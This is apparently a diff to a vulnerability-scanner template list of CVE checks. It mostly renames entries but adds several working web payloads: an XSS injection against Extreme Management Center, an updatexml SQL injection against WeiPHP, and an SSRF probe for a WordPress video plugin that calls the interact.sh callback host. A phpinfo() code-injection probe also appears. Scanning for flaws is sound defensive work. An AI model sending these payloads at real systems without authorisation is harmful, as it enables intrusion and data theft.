@@ -5062,7 +5062,7 @@
     {
       "id": "CVE-2016-7834",
       "info": {
-        "name": "Sony IPELA Engine IP Camera - Harcoded Account",
+        "name": "Sony IPELA Engine IP Camera - Hardcoded Account",
         "severity": "high"
       },
       "requests": [
@@ -6026,7 +6026,7 @@
     {
       "id": "CVE-2017-8917",
       "info": {
-        "name": "Joomla! < 3.7.1 - SQL Injection",
+        "name": "Joomla! <3.7.1 - SQL Injection",
         "severity": "critical"
       },
       "requests": [
@@ -8542,7 +8542,7 @@
     {
       "id": "CVE-2019-10692",
       "info": {
-        "name": "WP Google Maps < 7.11.18 - Unauthenticated SQL Injection",
+        "name": "WordPress Google Maps <7.11.18 - SQL Injection",
         "severity": "critical"
       },
       "requests": [
@@ -11029,6 +11029,21 @@
       ]
     },
     {
+      "id": "CVE-2020-13820",
+      "info": {
+        "name": "Extreme Management Center 8.4.1.24 - Cross Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/OneView/view/center?a%27+type%3d+%27text%27+autofocus+onfocus%3d%27alert(document.domain)"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2020-13927",
       "info": {
         "name": "Airflow Experimental <1.10.11 - REST API Auth Bypass",
@@ -11669,6 +11684,21 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/tests/support/stores/test_grid_filter.php?query=phpinfo();"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2020-20300",
+      "info": {
+        "name": "WeiPHP 5.0 - SQL Injection",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "method": "POST",
+          "path": [
+            "{{BaseURL}}/public/index.php/home/index/bind_follow/?publicid=1&is_ajax=1&uid[0]=exp&uid[1]=)%20and%20updatexml(1,concat(0x7e,md5('999999'),0x7e),1)--+ "
           ]
         }
       ]
@@ -13531,7 +13561,7 @@
     {
       "id": "CVE-2020-8654",
       "info": {
-        "name": "EyesOfNetwork 5.3 - Authenticated RCE",
+        "name": "EyesOfNetwork 5.1-5.3 - SQL Injection/Remote Code Execution",
         "severity": "high"
       },
       "requests": [
@@ -15458,7 +15488,7 @@
     {
       "id": "CVE-2021-25104",
       "info": {
-        "name": "Ocean Extra < 1.9.5 - Reflected Cross-Site Scripting",
+        "name": "WordPress Ocean Extra <1.9.5 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -17167,7 +17197,7 @@
     {
       "id": "CVE-2021-36873",
       "info": {
-        "name": "iQ Block Country plugin - Cross-Site Scripting",
+        "name": "WordPress iQ Block Country <=1.2.11 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -17463,7 +17493,7 @@
     {
       "id": "CVE-2021-39320",
       "info": {
-        "name": "WordPress underConstruction Plugin < 1.19 - Cross-Site Scripting",
+        "name": "WordPress Under Construction <1.19 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -18021,7 +18051,7 @@
     {
       "id": "CVE-2021-41878",
       "info": {
-        "name": "i-Panel Administration System - Cross-Site Scripting",
+        "name": "i-Panel Administration System 2.0 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -18247,7 +18277,7 @@
     {
       "id": "CVE-2021-42667",
       "info": {
-        "name": "Online Event Booking and Reservation System version 2.3.0 - SQL injection",
+        "name": "Online Event Booking and Reservation System 2.3.0 - SQL Injection",
         "severity": "critical"
       },
       "requests": [
@@ -20494,6 +20524,20 @@
       ]
     },
     {
+      "id": "CVE-2022-2633",
+      "info": {
+        "name": "All In One Video Gallery Plugin - Unauthenticated Arbitrary File Download & SSRF vulnerability",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "raw": [
+            "@timeout: 10s\nGET /index.php/video/?dl={{base64('http://interact.sh/')}} HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-26352",
       "info": {
         "name": "DotCMS - Arbitrary File Upload",
@@ -20696,7 +20740,7 @@
     {
       "id": "CVE-2022-29006",
       "info": {
-        "name": "Directory Management System  1.0 - SQLi Authentication Bypass",
+        "name": "Directory Management System 1.0 - SQL Injection",
         "severity": "critical"
       },
       "requests": [
@@ -20711,7 +20755,7 @@
     {
       "id": "CVE-2022-29007",
       "info": {
-        "name": "Dairy Farm Shop Management System v1.0 - SQLi Authentication Bypass",
+        "name": "Dairy Farm Shop Management System 1.0 - SQL Injection",
         "severity": "critical"
       },
       "requests": [
@@ -20726,7 +20770,7 @@
     {
       "id": "CVE-2022-29009",
       "info": {
-        "name": "Cyber Cafe Management System Project v1.0 - SQLi Authentication Bypass",
+        "name": "Cyber Cafe Management System 1.0 - SQL Injection",
         "severity": "critical"
       },
       "requests": [
@@ -21068,7 +21112,7 @@
     {
       "id": "CVE-2022-31373",
       "info": {
-        "name": "SolarView Compact 6.00 - Cross-Site Scripting(XSS)",
+        "name": "SolarView Compact 6.00 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -21202,7 +21246,7 @@
     {
       "id": "CVE-2022-32007",
       "info": {
-        "name": "Complete Online Job Search System v1.0 - SQL Injection",
+        "name": "Complete Online Job Search System 1.0 - SQL Injection",
         "severity": "high"
       },
       "requests": [
@@ -21217,7 +21261,7 @@
     {
       "id": "CVE-2022-32015",
       "info": {
-        "name": "Complete Online Job Search System v1.0 - SQL Injection",
+        "name": "Complete Online Job Search System 1.0 - SQL Injection",
         "severity": "high"
       },
       "requests": [
@@ -21232,7 +21276,7 @@
     {
       "id": "CVE-2022-32018",
       "info": {
-        "name": "Complete Online Job Search System v1.0 - SQL Injection",
+        "name": "Complete Online Job Search System 1.0 - SQL Injection",
         "severity": "high"
       },
       "requests": [
@@ -21247,7 +21291,7 @@
     {
       "id": "CVE-2022-32022",
       "info": {
-        "name": "Car Rental Management System v1.0 - SQL Injection",
+        "name": "Car Rental Management System 1.0 - SQL Injection",
         "severity": "high"
       },
       "requests": [
@@ -21262,7 +21306,7 @@
     {
       "id": "CVE-2022-32024",
       "info": {
-        "name": "Car Rental Management System v1.0 - SQL Injection",
+        "name": "Car Rental Management System 1.0 - SQL Injection",
         "severity": "high"
       },
       "requests": [
@@ -21277,7 +21321,7 @@
     {
       "id": "CVE-2022-32025",
       "info": {
-        "name": "Car Rental Management System v1.0 - SQL Injection",
+        "name": "Car Rental Management System 1.0 - SQL Injection",
         "severity": "high"
       },
       "requests": [
@@ -21292,7 +21336,7 @@
     {
       "id": "CVE-2022-32026",
       "info": {
-        "name": "Car Rental Management System v1.0 - SQL Injection",
+        "name": "Car Rental Management System 1.0 - SQL Injection",
         "severity": "high"
       },
       "requests": [
@@ -21307,7 +21351,7 @@
     {
       "id": "CVE-2022-32028",
       "info": {
-        "name": "Car Rental Management System v1.0 - SQL Injection",
+        "name": "Car Rental Management System 1.0 - SQL Injection",
         "severity": "high"
       },
       "requests": [
@@ -21322,7 +21366,7 @@
     {
       "id": "CVE-2022-32094",
       "info": {
-        "name": "Hospital Management System v1.0 - SQL Injection",
+        "name": "Hospital Management System 1.0 - SQL Injection",
         "severity": "critical"
       },
       "requests": [
@@ -21568,7 +21612,7 @@
     {
       "id": "CVE-2022-34590",
       "info": {
-        "name": "Hospital Management System v1.0 - SQL Injection",
+        "name": "Hospital Management System 1.0 - SQL Injection",
         "severity": "high"
       },
       "requests": [
@@ -21761,7 +21805,7 @@
     {
       "id": "CVE-2022-38637",
       "info": {
-        "name": "Hospital Management System v1.0 - SQL Injection",
+        "name": "Hospital Management System 1.0 - SQL Injection",
         "severity": "critical"
       },
       "requests": [
